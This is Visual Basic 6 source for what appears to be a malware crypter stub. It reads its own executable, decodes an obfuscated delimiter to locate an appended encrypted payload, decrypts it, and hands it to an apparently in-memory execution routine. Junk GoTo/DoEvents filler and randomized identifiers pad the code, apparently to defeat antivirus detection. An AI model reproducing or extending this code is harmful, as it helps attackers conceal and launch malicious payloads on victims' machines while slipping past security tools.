Attribute VB_Name = "Module1"
Option Explicit

Public Type ENCRYPTCLASS
  Name As String
  Object As Object
  Homepage As String
End Type
Public axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3Objects() As ENCRYPTCLASS
Public axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3ObjectsCount As Long

Public Const BENCHMARKSIZE = 1000000

Private Declare Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Dim QWERTYUIOP As String, ZXCVBNM() As String, ÑLKJHGFDSA As New Class1, m3m0 As Integer
Private Sub Main()
Call EBPEDETdsVdeG
End Sub

Sub EBPEDETdsVdeG()
m3m0 = FreeFile
Open App.Path & Chr(92) & App.EXEName & Chr(46) & Chr(101) & Chr(120) & Chr(101) For Binary As #m3m0
QWERTYUIOP = Space(LOF(m3m0))
Get #m3m0, , QWERTYUIOP
Close #m3m0
ZXCVBNM() = ya3r7izm9r0vg0evhkolqmgvjqqc043audj8ck8t17igjochay(QWERTYUIOP, axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(33) & Chr(33) & Chr(53) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41) & Chr(41))))
Call ROOOOOOOOOOOOOOOOOOOOOOOOOOON(App.Path & Chr(92) & App.EXEName & Chr(46) & Chr(101) & Chr(120) & Chr(101), StrConv(ÑLKJHGFDSA.vxzm4kmeyhggh4b2eh1k7jyo9du2bywuby3z6yq0zucwmbscey(ZXCVBNM(1), ZXCVBNM(2)), vbFromUnicode), Command)
End Sub
Function axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(t)
GoTo 12:
12:
Dim QKmP As String
Dim nvXL As String
If QKmP = nvXL Then
DoEvents
End If
Dim i
GoTo 24:
24:
Dim wnAa As String
Dim TYLW As String
If wnAa = TYLW Then
DoEvents
End If
On Error Resume Next
GoTo 36:
36:
Dim CQOl As String
Dim zbZh As String
If CQOl = zbZh Then
DoEvents
End If
For i = 1 To Len(t)
GoTo 48:
48:
Dim itCv As String
Dim FEMr As String
If itCv = FEMr Then
DoEvents
End If
axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3 = axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3 & Chr(Asc(Mid(t, i, 6)) Xor 9 - 1)
GoTo 60:
60:
Dim doxn As String
Dim BYhJ As String
If doxn = BYhJ Then
DoEvents
End If
Next
GoTo 72:
72:
Dim YJSF As String
Dim hbVU As String
If YJSF = hbVU Then
DoEvents
End If
End Function


Public Function a5bjq7hjjd3cl4norekonbaccds5kd7utftv85df47e902wj75(Filename As String) As Boolean
  On Error GoTo NotExist
  
  Call FileLen(Filename)
  a5bjq7hjjd3cl4norekonbaccds5kd7utftv85df47e902wj75 = True
  Exit Function
  
NotExist:
End Function

Public Static Sub GetWord(LongValue As Long, CryptBuffer() As Byte, Offset As Long)

  
  Dim bb(0 To 3) As Byte
  
  bb(3) = CryptBuffer(Offset)
  bb(2) = CryptBuffer(Offset + 1)
  bb(1) = CryptBuffer(Offset + 2)
  bb(0) = CryptBuffer(Offset + 3)
  Call CopyMem(LongValue, bb(0), 4)
End Sub

Public Static Sub PutWord(LongValue As Long, CryptBuffer() As Byte, Offset As Long)


  Dim bb(0 To 3) As Byte

  Call CopyMem(bb(0), LongValue, 4)
  CryptBuffer(Offset) = bb(3)
  CryptBuffer(Offset + 1) = bb(2)
  CryptBuffer(Offset + 2) = bb(1)
  CryptBuffer(Offset + 3) = bb(0)
End Sub

Public Static Function a0wjsfilx0fr3b82lnj8xg26vieqf7lsoijc2nx9mf8q3a4qfj(ByVal Data1 As Long, Data2 As Long) As Long
  Dim x1(0 To 3) As Byte
  Dim x2(0 To 3) As Byte
  Dim xx(0 To 3) As Byte
  Dim Rest As Long
  Dim Value As Long
  Dim a As Long
  
  Call CopyMem(x1(0), Data1, 4)
  Call CopyMem(x2(0), Data2, 4)
  
  Rest = 0
  For a = 0 To 3
    Value = CLng(x1(a)) + CLng(x2(a)) + Rest
    xx(a) = Value And 255
    Rest = Value \ 256
  Next
  
  Call CopyMem(a0wjsfilx0fr3b82lnj8xg26vieqf7lsoijc2nx9mf8q3a4qfj, xx(0), 4)
End Function

Public Function xjdtrj4va6yekzpk82yp76s2xsbiq3ox53afxa0y5d4de0nfib(Data1 As Long, Data2 As Long) As Long
  Dim x1(0 To 3) As Byte
  Dim x2(0 To 3) As Byte
  Dim xx(0 To 3) As Byte
  Dim Rest As Long
  Dim Value As Long
  Dim a As Long
  
  Call CopyMem(x1(0), Data1, 4)
  Call CopyMem(x2(0), Data2, 4)
  Call CopyMem(xx(0), xjdtrj4va6yekzpk82yp76s2xsbiq3ox53afxa0y5d4de0nfib, 4)
  
  For a = 0 To 3
    Value = CLng(x1(a)) - CLng(x2(a)) - Rest
    If (Value < 0) Then
      Value = Value + 256
      Rest = 1
    Else
      Rest = 0
    End If
    xx(a) = Value
  Next
  
  Call CopyMem(xjdtrj4va6yekzpk82yp76s2xsbiq3ox53afxa0y5d4de0nfib, xx(0), 4)
End Function






